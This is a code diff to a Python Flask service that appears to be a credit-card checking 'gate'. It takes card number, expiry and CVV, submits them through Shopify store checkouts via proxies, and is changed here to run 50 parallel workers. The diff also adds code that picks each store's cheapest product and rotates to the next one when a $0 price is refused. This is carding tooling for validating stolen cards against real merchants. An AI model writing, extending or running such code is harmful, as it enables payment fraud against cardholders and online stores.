@@ -370,7 +370,7 @@ def _sa_run(cc):
 
 
 # ─── Shopify v2 lane (new checkout negotiation engine) — single-shot, no internal proxy logic ───
-_sh2_exec = concurrent.futures.ThreadPoolExecutor(max_workers=12)
+_sh2_exec = concurrent.futures.ThreadPoolExecutor(max_workers=50)
 
 @app.route("/sh2")
 def sh2_check():
@@ -415,11 +415,37 @@ def sh2_check():
     })
 
 def _sh2_run(cc, site, proxy, variant):
-    from gates.shopify_v2 import process_card as _sh2pc
+    from gates.shopify_v2 import process_card as _sh2pc, fetch_products as _sfp
     import asyncio as _aio
     parts = cc.split("|")
     ccn, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-    return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, variant, proxy or None))
+
+    async def _one(vid):
+        return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, vid, proxy or None))
+
+    if variant:
+        return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, variant, proxy or None))
+
+    # pick the cheapest, then rotate to next-cheapest when a store re-prices one to $0
+    site_url = site if site.startswith("http") else f"https://{site}"
+    try:
+        info = _aio.run(_sfp(site_url, proxy or None))
+    except Exception:
+        info = None
+    cands = []
+    if isinstance(info, dict) and info.get("variant_id"):
+        cands = [info["variant_id"]] + list(info.get("candidates") or [])
+    if not cands:
+        return _aio.run(_sh2pc(ccn, mm, yy, cvv, site, None, proxy or None))
+
+    last = (False, "Unknown", "UNKNOWN", "0", "USD")
+    for vid in cands[:3]:
+        res = _one(vid)
+        last = res
+        if "PAYMENTS_POSITIVE_AMOUNT_EXPECTED" not in str(res[1]):
+            return res
+    return last
+
 
 
 # ─── Xonic Unified Gateway — root listing + per-gate health tracking ───
